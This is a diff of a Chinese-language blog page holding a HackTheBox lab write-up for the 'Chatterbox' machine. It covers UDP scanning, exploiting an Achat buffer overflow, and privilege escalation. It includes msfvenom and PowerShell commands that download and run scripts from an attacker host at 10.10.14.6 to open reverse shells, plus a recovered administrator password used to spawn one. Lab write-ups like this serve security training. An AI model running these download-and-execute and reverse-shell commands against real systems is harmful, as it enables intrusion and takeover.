@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;123  10.10.10.74                                                                                                              端口扫描需要UDP全端口，非常见端口925">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;123  10.10.10.74   端口扫描需要UDP全端口，非常见端口9255和9256: 1234567891011$ sudo nmap -sU -p9255,9256 10.10.10.74Password:Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Chatterbox - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/02/21/Chatterbox-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;123  10.10.10.74                                                                                                              端口扫描需要UDP全端口，非常见端口925">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;123  10.10.10.74   端口扫描需要UDP全端口，非常见端口9255和9256: 1234567891011$ sudo nmap -sU -p9255,9256 10.10.10.74Password:Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020803.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -211,14 +218,7 @@
 </li>
 <li><h2 id="10-10-10-74"><a href="#10-10-10-74" class="headerlink" title="10.10.10.74"></a>10.10.10.74</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020801.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要UDP全端口，非常见端口9255和9256:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nmap -sU -p9255,9256 10.10.10.74</span></span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 14:29 CST</span><br><span class="line">Nmap scan report for 10.10.10.74</span><br><span class="line">Host is up (0.084s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">9255/udp open|filtered mon</span><br><span class="line">9256/udp open|filtered unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.09 seconds</span><br></pre></td></tr></table></figure>
 
@@ -232,91 +232,28 @@
 <li>Achat 0.150 beta7 - Remote Buffer Overflow - Windows remote Exploit<br><a href="https://www.exploit-db.com/exploits/36025" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36025</a></li>
 </ul>
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>msf里的模块打到的meterpreter几秒后就会断，加上auto migrate也一样：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020802.jpg" alt=""></p>
 <h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p> 执行方式换成powershell reverse就可以，比较稳定：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;exec CMD&#x3D;&quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.14.6:7777&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; 。。。</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020803.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020804.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020805.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>alfred用户桌面得到user flag:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020806.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>powerup可以发现注册表中的密码</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.6:7777/PowerUp.ps1'</span>)</span><br><span class="line">Invoke-AllChecks</span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">for</span> Autologon credentials <span class="keyword">in</span> registry...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DefaultDomainName    :</span><br><span class="line">DefaultUserName      : Alfred</span><br><span class="line">DefaultPassword      : Welcome1!</span><br><span class="line">AltDefaultDomainName :</span><br><span class="line">AltDefaultUserName   :</span><br><span class="line">AltDefaultPassword   :</span><br></pre></td></tr></table></figure>
 
 <p>这个密码就是管理员密码</p>
 <h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>权限配置错误，Alfred对root.txt没有权限，但对Desktop有权限：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020807.jpg" alt=""></p>
 <h1 id="提权-amp-amp-root-flag"><a href="#提权-amp-amp-root-flag" class="headerlink" title="提权 &amp;&amp; root flag"></a>提权 &amp;&amp; root flag</h1><h2 id="icacls"><a href="#icacls" class="headerlink" title="icacls"></a>icacls</h2><p>直接修改权限后读取root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020808.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020808.jpg" alt=""></p>
 <h2 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h2><p>使用密码得到Administrator session,执行reverse shell:</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'Welcome1!'</span> -AsPlainText -Force;</span><br><span class="line"><span class="variable">$creds</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'administrator'</span>,<span class="variable">$passwd</span>);</span><br><span class="line"><span class="built_in">Start-Process</span> -FilePath <span class="string">"powershell"</span> -argumentlist <span class="string">"IEX(New-Object Net.webClient).downloadString('http://10.10.14.6:7777/Invoke-PowerShellTcp.ps1')"</span> -Credential <span class="variable">$creds</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020809.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020810.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020809.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020810.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Port 9256 (tcp/udp) :: SpeedGuide<br><a href="https://www.speedguide.net/port.php?port=9256" target="_blank" rel="noopener">https://www.speedguide.net/port.php?port=9256</a></li>
 <li>Achat 0.150 beta7 - Remote Buffer Overflow - Windows remote Exploit<br><a href="https://www.exploit-db.com/exploits/36025" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36025</a></li>
@@ -332,7 +269,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-02-08T06:36:34.747Z" itemprop="dateUpdated">2021-02-08 14:36:34</time>
+    Last updated: <time datetime="2021-02-08T06:36:34.747Z" itemprop="dateUpdated">2021-02-08 14:36:34</time>
 </span><br>
 
 
@@ -499,11 +436,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
